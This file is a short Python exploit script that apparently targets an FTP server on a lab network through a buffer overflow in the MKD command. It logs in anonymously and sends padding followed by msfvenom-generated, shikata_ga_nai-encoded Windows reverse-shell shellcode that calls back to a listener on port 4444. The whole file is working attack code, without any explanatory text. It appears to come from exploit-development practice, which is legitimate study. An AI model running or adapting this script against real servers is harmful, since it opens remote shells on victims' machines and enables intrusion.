#!/usr/bin/python

import socket

target_host = "192.168.252.128"
target_port = 21


#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.252.1 LPORT=4444 -b "\x00\x0a\x0d" -f c
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 368 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351

shellcode = (
"\xda\xd3\xd9\x74\x24\xf4\xba\x03\xf9\x6c\xeb\x58\x2b\xc9\xb1"
"\x52\x31\x50\x17\x83\xe8\xfc\x03\x53\xea\x8e\x1e\xaf\xe4\xcd"
"\xe1\x4f\xf5\xb1\x68\xaa\xc4\xf1\x0f\xbf\x77\xc2\x44\xed\x7b"
"\xa9\x09\x05\x0f\xdf\x85\x2a\xb8\x6a\xf0\x05\x39\xc6\xc0\x04"
"\xb9\x15\x15\xe6\x80\xd5\x68\xe7\xc5\x08\x80\xb5\x9e\x47\x37"
"\x29\xaa\x12\x84\xc2\xe0\xb3\x8c\x37\xb0\xb2\xbd\xe6\xca\xec"
"\x1d\x09\x1e\x85\x17\x11\x43\xa0\xee\xaa\xb7\x5e\xf1\x7a\x86"
"\x9f\x5e\x43\x26\x52\x9e\x84\x81\x8d\xd5\xfc\xf1\x30\xee\x3b"
"\x8b\xee\x7b\xdf\x2b\x64\xdb\x3b\xcd\xa9\xba\xc8\xc1\x06\xc8"
"\x96\xc5\x99\x1d\xad\xf2\x12\xa0\x61\x73\x60\x87\xa5\xdf\x32"
"\xa6\xfc\x85\x95\xd7\x1e\x66\x49\x72\x55\x8b\x9e\x0f\x34\xc4"
"\x53\x22\xc6\x14\xfc\x35\xb5\x26\xa3\xed\x51\x0b\x2c\x28\xa6"
"\x6c\x07\x8c\x38\x93\xa8\xed\x11\x50\xfc\xbd\x09\x71\x7d\x56"
"\xc9\x7e\xa8\xf9\x99\xd0\x03\xba\x49\x91\xf3\x52\x83\x1e\x2b"
"\x42\xac\xf4\x44\xe9\x57\x9f\xaa\x46\xab\xdf\x43\x95\x53\xf1"
"\xcf\x10\xb5\x9b\xff\x74\x6e\x34\x99\xdc\xe4\xa5\x66\xcb\x81"
"\xe6\xed\xf8\x76\xa8\x05\x74\x64\x5d\xe6\xc3\xd6\xc8\xf9\xf9"
"\x7e\x96\x68\x66\x7e\xd1\x90\x31\x29\xb6\x67\x48\xbf\x2a\xd1"
"\xe2\xdd\xb6\x87\xcd\x65\x6d\x74\xd3\x64\xe0\xc0\xf7\x76\x3c"
"\xc8\xb3\x22\x90\x9f\x6d\x9c\x56\x76\xdc\x76\x01\x25\xb6\x1e"
"\xd4\x05\x09\x58\xd9\x43\xff\x84\x68\x3a\x46\xbb\x45\xaa\x4e"
"\xc4\xbb\x4a\xb0\x1f\x78\x7a\xfb\x3d\x29\x13\xa2\xd4\x6b\x7e"
"\x55\x03\xaf\x87\xd6\xa1\x50\x7c\xc6\xc0\x55\x38\x40\x39\x24"
"\x51\x25\x3d\x9b\x52\x6c"
)

# bad characters = \x00\x0a\x0d

buffer = ("A" * 248 + "B"* 4 + "C" * 8 + shellcode + "D" * (1000-248-4-len(shellcode)))




s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((target_host,target_port))
response = s.recv(1024)
s.send('anonymous\r\n')
response = s.recv(1024)
s.send('anonymous\r\n')
response = s.recv(1024)

s.send('MKD' + buffer + '\r\n')
s.close()
